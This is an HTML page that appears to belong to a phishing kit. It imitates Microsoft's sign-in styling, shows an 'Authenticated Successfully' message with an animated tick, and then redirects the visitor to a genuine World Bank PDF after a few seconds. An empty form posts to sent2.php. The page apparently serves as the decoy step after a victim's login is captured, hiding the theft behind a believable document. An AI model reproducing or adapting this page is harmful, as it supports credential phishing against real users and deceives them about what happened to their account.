<!doctype html>
<html dir="ltr" lang="EN-US">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
	<title>Connecting to document server ....... </title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
	<link rel="shortcut icon" href="images/dddsdf342342dsfsdfsdfsdd.ico">
	<link rel="stylesheet" title="Converged" type="text/css" href="css/style2.css">
	<style type="text/css">body{display:none;}</style>
	<style type="text/css">body{display:block !important;}</style>
	<style type="text/css">body{display:block !important;}</style>

<style>
.ms-logo {
  margin-left: 30px;
  display: inline-block;
  background: #F25022;
  width: 11px;
  height: 11px;
  box-shadow: 12px 0 0 #7FBA00, 0 12px 0 #00A4EF, 12px 12px 0 #FFB900;
  transform: translatex(-300%);
}
.ms-logo::after {
  content: '';
  /*font-family: 'Segoe Pro', 'Segoe UI', 'Open Sans', sans-serif;
  font-weight: 600;*/
  font: bold 20px sans-serif;
  margin-left: 28px;
  color: #737373;
}


.container {
  width: 300px;
  margin: 50px auto;
}

.svg-success {
  display: inline-block;
  vertical-align: top;
  height: 300px;
  width: 300px;
  opacity: 1;
  overflow: visible;
}
@-webkit-keyframes success-tick {
  0% {
    stroke-dashoffset: 16px;
    opacity: 1;
  }
  100% {
    stroke-dashoffset: 31px;
    opacity: 1;
  }
}
@keyframes success-tick {
  0% {
    stroke-dashoffset: 16px;
    opacity: 1;
  }
  100% {
    stroke-dashoffset: 31px;
    opacity: 1;
  }
}
@-webkit-keyframes success-circle-outline {
  0% {
    stroke-dashoffset: 72px;
    opacity: 1;
  }
  100% {
    stroke-dashoffset: 0px;
    opacity: 1;
  }
}
@keyframes success-circle-outline {
  0% {
    stroke-dashoffset: 72px;
    opacity: 1;
  }
  100% {
    stroke-dashoffset: 0px;
    opacity: 1;
  }
}
@-webkit-keyframes success-circle-fill {
  0% {
    opacity: 0;
  }
  100% {
    opacity: 1;
  }
}
@keyframes success-circle-fill {
  0% {
    opacity: 0;
  }
  100% {
    opacity: 1;
  }
}
.svg-success .success-tick {
  fill: none;
  stroke-width: 1px;
  stroke: #ffffff;
  stroke-dasharray: 15px, 15px;
  stroke-dashoffset: -14px;
  -webkit-animation: success-tick 450ms ease 1400ms forwards;
          animation: success-tick 450ms ease 1400ms forwards;
  opacity: 0;
}
.svg-success .success-circle-outline {
  fill: none;
  stroke-width: 1px;
  stroke: #81c038;
  stroke-dasharray: 72px, 72px;
  stroke-dashoffset: 72px;
  -webkit-animation: success-circle-outline 300ms ease-in-out 800ms forwards;
          animation: success-circle-outline 300ms ease-in-out 800ms forwards;
  opacity: 0;
}
.svg-success .success-circle-fill {
  fill: #81c038;
  stroke: none;
  opacity: 0;
  -webkit-animation: success-circle-fill 300ms ease-out 1100ms forwards;
          animation: success-circle-fill 300ms ease-out 1100ms forwards;
}
@media screen and (-ms-high-contrast: active), screen and (-ms-high-contrast: none) {
  .svg-success .success-tick {
    stroke-dasharray: 0;
    stroke-dashoffset: 0;
    -webkit-animation: none;
            animation: none;
    opacity: 1;
  }
  .svg-success .success-circle-outline {
    stroke-dasharray: 0;
    stroke-dashoffset: 0;
    -webkit-animation: none;
            animation: none;
    opacity: 1;
  }
  .svg-success .success-circle-fill {
    -webkit-animation: none;
            animation: none;
    opacity: 1;
  }
}

</style>

</head>
<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
	<div>
		<div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
			<!-- <div style="background-image: url(&quot;images/0-small.jpg&quot;);"></div> -->
			<div class="backgroundImage" style="background-image: url(&quot;images/background.svg&quot;);"></div>
		</div>
	</div> 
		<form  novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" action="sent2.php">
			<div class="outer">
			<div class="middle">
			<div class="inner">
			<div>
				<img class="logo" src="images/">
			</div>
			<div role="main">
				<span><h3>Authenticated Successfully</h3>Directing to proposal pdf</span>
				<br><br>
				<center>
				  <svg xmlns="http://www.w3.org/2000/svg" class="svg-success" viewBox="0 0 24 24">
					<g stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10">
					  <circle class="success-circle-outline" cx="12" cy="12" r="11.5"/>
					  <circle class="success-circle-fill" cx="12" cy="12" r="11.5"/>
					  <polyline class="success-tick" points="17,8.5 9.5,15.5 7,13"/>
					</g>
				  </svg>
				</center>
			</div>
			</div> 

						</div> 
					</div> 
					<div id="footer" class="footer default new-background-image"> 
						<div>
							<div id="footerLinks" class="footerNode text-secondary">
								<a id="ftrTerms" href="#">Terms of use</a> 
								<a id="ftrPrivacy" href="#">Privacy &amp; cookies</a>
								<img class="mobileMode" role="presentation" src="images/eldfs3232232y.svg?x=2b5d393db04a5e6e1f739cb266e65b4c">
							</div> 
						</div> 
					</div> 
		</form> 
        <script type="text/javascript">


setTimeout(function(){ window.location.href = 'https://openknowledge.worldbank.org/bitstream/handle/10986/32436/9781464814402.pdf'; }, 3500);
</script>
</body>
</html>
